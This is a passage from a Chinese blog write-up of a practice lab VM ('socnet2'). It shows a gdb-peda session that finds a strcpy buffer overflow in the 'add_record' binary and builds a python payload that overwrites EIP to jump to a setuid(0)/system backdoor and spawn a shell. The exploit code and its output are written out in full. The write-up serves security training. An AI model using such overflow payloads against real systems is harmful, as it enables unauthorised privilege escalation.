class="built_in">ebx</span>,<span class="number">0x1654</span>)</span><br><span class="line"><span class="number">0012</span>| <span class="number">0xffffdc60</span> --&gt; <span class="number">0x0</span></span><br><span class="line"><span class="number">0016</span>| <span class="number">0xffffdc64</span> --&gt; <span class="number">0x0</span></span><br><span class="line"><span class="number">0020</span>| <span class="number">0xffffdc68</span> --&gt; <span class="number">0xc2</span></span><br><span class="line"><span class="number">0024</span>| <span class="number">0xffffdc6c</span> --&gt; <span class="number">0x414e</span> (<span class="string">&#x27;NA&#x27;</span>)</span><br><span class="line"><span class="number">0028</span>| <span class="number">0xffffdc70</span> --&gt; <span class="number">0x0</span></span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line"><span class="symbol">Legend:</span> code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0x0804873d</span> <span class="keyword">in</span> main ()</span><br></pre></td></tr></table></figure>

<p>输入s单步执行</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gdb</span>-peda$ s</span><br><span class="line"><span class="attribute">s</span><span class="meta"></span></span><br><span class="line"><span class="meta">[----------------------------------registers-----------------------------------]</span></span><br><span class="line"><span class="attribute">EAX</span>: <span class="number">0</span>x<span class="number">8048974</span> (<span class="string">&quot;Welcome to Add Record application\nUse it to add info about Social Network 2.0 Employees&quot;</span>)</span><br><span class="line"><span class="attribute">EBX</span>: <span class="number">0</span>x<span class="number">8049</span>d<span class="number">48</span> --&gt; <span class="number">0</span>x<span class="number">8049</span>c<span class="number">58</span> --&gt; <span class="number">0</span>x<span class="number">1</span></span><br><span class="line"><span class="attribute">ECX</span>: <span class="number">0</span>xffffffff</span><br><span class="line"><span class="attribute">EDX</span>: <span class="number">0</span>xffffffff</span><br></pre></td></tr></table></figure>

<p>可以看到EAX就是puts函数的内容。</p>
<p>删除断点</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb<span class="literal">-peda</span><span class="variable">$</span> <span class="built_in">del</span> <span class="number">1</span></span><br><span class="line"><span class="built_in">del</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>





<p>查看所有函数函数</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">info</span> func</span><br></pre></td></tr></table></figure>



<p>查看vuln函数</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disas vuln</span><br><span class="line">disas vuln</span><br><span class="line">Dump of assembler code for function vuln:</span><br><span class="line">   <span class="number">0x080486ad</span> &lt;+<span class="number">0</span>&gt;:	<span class="keyword">push</span>   <span class="built_in">ebp</span></span><br><span class="line">   <span class="number">0x080486ae</span> &lt;+<span class="number">1</span>&gt;:	<span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line">   <span class="number">0x080486b0</span> &lt;+<span class="number">3</span>&gt;:	<span class="keyword">push</span>   <span class="built_in">ebx</span></span><br><span class="line">   <span class="number">0x080486b1</span> &lt;+<span class="number">4</span>&gt;:	<span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0x44</span></span><br><span class="line">   <span class="number">0x080486b4</span> &lt;+<span class="number">7</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x80488c2</span> &lt;__x86<span class="number">.</span>get_pc_thunk<span class="number">.</span><span class="built_in">ax</span>&gt;</span><br><span class="line">   <span class="number">0x080486b9</span> &lt;+<span class="number">12</span>&gt;:	<span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="number">0x168f</span></span><br><span class="line">   <span class="number">0x080486be</span> &lt;+<span class="number">17</span>&gt;:	<span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x080486c1</span> &lt;+<span class="number">20</span>&gt;:	<span class="keyword">push</span>   <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x080486c4</span> &lt;+<span class="number">23</span>&gt;:	<span class="keyword">lea</span>    <span class="built_in">edx</span>,[<span class="built_in">ebp</span>-<span class="number">0x3a</span>]</span><br><span class="line">   <span class="number">0x080486c7</span> &lt;+<span class="number">26</span>&gt;:	<span class="keyword">push</span>   <span class="built_in">edx</span></span><br><span class="line">   <span class="number">0x080486c8</span> &lt;+<span class="number">27</span>&gt;:	<span class="keyword">mov</span>    <span class="built_in">ebx</span>,<span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x080486ca</span> &lt;+<span class="number">29</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x80484d0</span> &lt;strcpy@plt&gt;</span><br><span class="line">   <span class="number">0x080486cf</span> &lt;+<span class="number">34</span>&gt;:	<span class="keyword">add</span>    <span class="built_in">esp</span>,<span class="number">0x10</span></span><br><span class="line">   <span class="number">0x080486d2</span> &lt;+<span class="number">37</span>&gt;:	<span class="keyword">nop</span></span><br><span class="line">   <span class="number">0x080486d3</span> &lt;+<span class="number">38</span>&gt;:	<span class="keyword">mov</span>    <span class="built_in">ebx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x4</span>]</span><br><span class="line">   <span class="number">0x080486d6</span> &lt;+<span class="number">41</span>&gt;:	<span class="keyword">leave</span></span><br><span class="line">   <span class="number">0x080486d7</span> &lt;+<span class="number">42</span>&gt;:	<span class="keyword">ret</span></span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>



<p>调用了<code>0x80484d0 &lt;strcpy@plt&gt;</code>，strcpy函数存在缓冲区溢出漏洞</p>
<p>查看backdoor函数</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disas backdoor</span><br><span class="line">disas backdoor</span><br><span class="line">Dump of assembler code for function backdoor:</span><br><span class="line">   <span class="number">0x08048676</span> &lt;+<span class="number">0</span>&gt;:	<span class="keyword">push</span>   <span class="built_in">ebp</span></span><br><span class="line">   <span class="number">0x08048677</span> &lt;+<span class="number">1</span>&gt;:	<span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line">   <span class="number">0x08048679</span> &lt;+<span class="number">3</span>&gt;:	<span class="keyword">push</span>   <span class="built_in">ebx</span></span><br><span class="line">   <span class="number">0x0804867a</span> &lt;+<span class="number">4</span>&gt;:	<span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x0804867d</span> &lt;+<span class="number">7</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x80485b0</span> &lt;__x86<span class="number">.</span>get_pc_thunk<span class="number">.</span><span class="built_in">bx</span>&gt;</span><br><span class="line">   <span class="number">0x08048682</span> &lt;+<span class="number">12</span>&gt;:	<span class="keyword">add</span>    <span class="built_in">ebx</span>,<span class="number">0x16c6</span></span><br><span class="line">   <span class="number">0x08048688</span> &lt;+<span class="number">18</span>&gt;:	<span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0xc</span></span><br><span class="line">   <span class="number">0x0804868b</span> &lt;+<span class="number">21</span>&gt;:	<span class="keyword">push</span>   <span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0804868d</span> &lt;+<span class="number">23</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x8048530</span> &lt;setuid@plt&gt;</span><br><span class="line">   <span class="number">0x08048692</span> &lt;+<span class="number">28</span>&gt;:	<span class="keyword">add</span>    <span class="built_in">esp</span>,<span class="number">0x10</span></span><br><span class="line">   <span class="number">0x08048695</span> &lt;+<span class="number">31</span>&gt;:	<span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0xc</span></span><br><span class="line">   <span class="number">0x08048698</span> &lt;+<span class="number">34</span>&gt;:	<span class="keyword">lea</span>    <span class="built_in">eax</span>,[<span class="built_in">ebx</span>-<span class="number">0x13f8</span>]</span><br><span class="line">   <span class="number">0x0804869e</span> &lt;+<span class="number">40</span>&gt;:	<span class="keyword">push</span>   <span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x0804869f</span> &lt;+<span class="number">41</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x80484f0</span> &lt;system@plt&gt;</span><br><span class="line">   <span class="number">0x080486a4</span> &lt;+<span class="number">46</span>&gt;:	<span class="keyword">add</span>    <span class="built_in">esp</span>,<span class="number">0x10</span></span><br><span class="line">   <span class="number">0x080486a7</span> &lt;+<span class="number">49</span>&gt;:	<span class="keyword">nop</span></span><br><span class="line">   <span class="number">0x080486a8</span> &lt;+<span class="number">50</span>&gt;:	<span class="keyword">mov</span>    <span class="built_in">ebx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x4</span>]</span><br><span class="line">   <span class="number">0x080486ab</span> &lt;+<span class="number">53</span>&gt;:	<span class="keyword">leave</span></span><br><span class="line">   <span class="number">0x080486ac</span> &lt;+<span class="number">54</span>&gt;:	<span class="keyword">ret</span></span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>



<p><code>0x8048530 &lt;setuid@plt&gt;</code>， <code>0x80484f0 &lt;system@plt&gt;</code>，这里明显存在可利用的点，我们可以在EIP注入backdoor的起始地址<code>0x08048676</code>，</p>
<h3 id="执行payload"><a href="#执行payload" class="headerlink" title="执行payload"></a>执行payload</h3><p>(在item2特殊字符有问题，换默认terminal就行了)</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python <span class="operator">-</span>c <span class="string">&quot;import struct; print(&#x27;aa<span class="subst">\n</span>1<span class="subst">\n</span>1<span class="subst">\n</span>1<span class="subst">\n</span>&#x27; + &#x27;A&#x27;*62 + struct.pack(&#x27;I&#x27;, 0x08048676))&quot;</span> <span class="operator">&gt;</span> <span class="operator">/</span>tmp<span class="operator">/</span>payload.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[shadowflow<span class="meta">@ShadowOS</span> <span class="operator">~</span>]$ cat <span class="operator">/</span>tmp<span class="operator">/</span>payload.txt</span><br><span class="line">aa</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="type">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAv</span>?</span><br></pre></td></tr></table></figure>



<p>退出gdb。生成payload</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ q</span><br><span class="line">q</span><br><span class="line">socnet@socnet2:<span class="symbol">~$ python -c &quot;import struct</span>; print(&#x27;aa\n1\n1\n1\n&#x27; + &#x27;A&#x27;*<span class="number">62</span> + struct.pack(&#x27;I&#x27;, <span class="number">0</span>x08048676))<span class="string">&quot; &gt; /tmp/payload.txt</span></span><br><span class="line">&lt;+ struct.pack(&#x27;I&#x27;, <span class="number">0</span>x08048676))<span class="string">&quot; &gt; /tmp/payload.txt</span></span><br><span class="line">socnet@socnet2:<span class="symbol">~$ cat /tmp/payload.txt</span></span><br><span class="line"><span class="symbol">cat /tmp/payload.txt</span></span><br><span class="line"><span class="symbol">aa</span></span><br><span class="line"><span class="symbol">1</span></span><br><span class="line"><span class="symbol">1</span></span><br><span class="line"><span class="symbol">1</span></span><br><span class="line"><span class="symbol">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAv�</span></span><br></pre></td></tr></table></figure>

<p>重新进入gdb</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">socnet@socnet2:~$ gdb -q <span class="string">./add_record</span></span><br><span class="line">gdb -q <span class="string">./add_record</span></span><br><span class="line">Reading symbols from <span class="string">./add_record...</span><span class="params">(no debugging symbols found)</span><span class="string">...done</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">gdb-peda$ r &lt; /tmp/payload.txt</span><br><span class="line">r &lt; /tmp/payload.txt</span><br><span class="line">Starting program: /home/socnet/add_record &lt; /tmp/payload.txt</span><br><span class="line">Welcome <span class="keyword">to</span> Add <span class="keyword">Record</span> application</span><br><span class="line"><span class="keyword">Use</span> it <span class="keyword">to</span> add info about Social Network <span class="number">2.0</span> Employees</span><br><span class="line">[<span class="keyword">New</span> <span class="keyword">process</span> <span class="number">18307</span>]</span><br><span class="line"><span class="keyword">process</span> <span class="number">18307</span> <span class="keyword">is</span> executing <span class="keyword">new</span> program: /bin/dash</span><br><span class="line">[<span class="keyword">New</span> <span class="keyword">process</span> <span class="number">18308</span>]</span><br><span class="line"><span class="keyword">process</span> <span class="number">18308</span> <span class="keyword">is</span> executing <span class="keyword">new</span> program: /bin/bash</span><br><span class="line">[Inferior <span class="number">3</span> (<span class="keyword">process</span> <span class="number">18308</span>) exited normally]</span><br><span class="line"><span class="literal">Warning</span>: <span class="keyword">not</span> running <span class="keyword">or</span> target <span class="keyword">is</span> remote</span><br></pre></td></tr></table></figure>

<p>可以看见先起了dash，又启动了bash。</p>
<p>经过不断调试分析，最终执行方式如下</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/tmp/</span>payload.txt - | ./add_record</span><br></pre></td></tr></table></figure>




















































    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E6%89%93%E9%9D%B6/" rel="tag"># 打靶</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A04-AdmX-new/" rel="prev" title="打靶练习4-AdmX_new">
      <i class="fa fa-chevron-left"></i> 打靶练习4-AdmX_new
    </a></div>
      <div class="post-nav-item">
    <a href="/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A06-EvilBoxOne/" rel="next" title="打靶练习6-EvilBoxOne">
      打靶练习6-EvilBoxOne <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-text">1. 主机发现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#arp%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-text">arp主机发现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap%E5%85%A8%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">nmap全端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB"><span class="nav-text">nmap服务识别</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E5%85%A5%E4%BE%B5"><span class="nav-text">web入侵</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0webshell"><span class="nav-text">文件上传webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-text">sql注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2021-3493%E6%8F%90%E6%9D%83"><span class="nav-text">CVE-2021-3493提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2021-3493"><span class="nav-text">CVE-2021-3493</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mkfifo%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">mkfifo反弹shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E5%88%B0socnet%E8%B4%A6%E5%8F%B7"><span class="nav-text">提权到socnet账号</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E5%86%99xmlrpc-exploit"><span class="nav-text">编写xmlrpc exploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81"><span class="nav-text">爆破密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9%E8%84%9A%E6%9C%AC"><span class="nav-text">反弹脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python%E5%8D%87%E7%BA%A7shell"><span class="nav-text">python升级shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8GDB%E8%BF%9B%E8%A1%8C%E7%BC%93%E5%AD%98%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="nav-text">使用GDB进行缓存区溢出漏洞挖掘</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gdb%E8%B0%83%E8%AF%95%E8%BF%9B%E8%A1%8C%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="nav-text">gdb调试进行缓冲区溢出漏洞挖掘</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gdb%E7%89%B9%E5%BE%81%E5%AD%97%E7%AC%A6"><span class="nav-text">gdb特征字符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8gdb-patter-search"><span class="nav-text">使用gdb patter search</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GDB%E8%B0%83%E8%AF%95"><span class="nav-text">GDB调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8Cpayload"><span class="nav-text">执行payload</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="ShadowFl0w"
      src="/images/touxiang.jpeg">
  <p class="site-author-name" itemprop="name">ShadowFl0w</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">55</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">34</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/ShadowFl0w" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ShadowFl0w" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/ShadowFl0w" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;ShadowFl0w" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ShadowFl0w</span>
</div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
